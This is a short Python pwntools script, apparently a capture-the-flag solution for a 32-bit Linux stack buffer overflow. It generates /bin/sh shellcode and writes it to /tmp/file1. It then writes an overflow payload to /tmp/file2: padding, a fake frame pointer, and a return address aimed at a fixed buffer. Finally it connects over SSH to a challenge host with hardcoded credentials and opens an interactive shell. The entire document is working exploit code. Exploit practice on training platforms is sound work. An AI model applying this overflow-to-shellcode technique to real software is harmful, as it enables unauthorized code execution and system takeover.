from pwn import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()



context(arch = 'i386', os = 'linux')

buf = 0x804a024
shellcode = asm(shellcraft.sh())
payload = 'A' * 0x78 + 'dead' + p32(buf)

file1 = open("/tmp/file1", "a")
file1.write(shellcode)
file1.close()

file2 = open("/tmp/file2",'a')
file2.write(payload)
file2.close()

print payload
pause()

p = ssh(host='node3.buuoj.cn',user='ctf',password='guest',port=28122)
ia()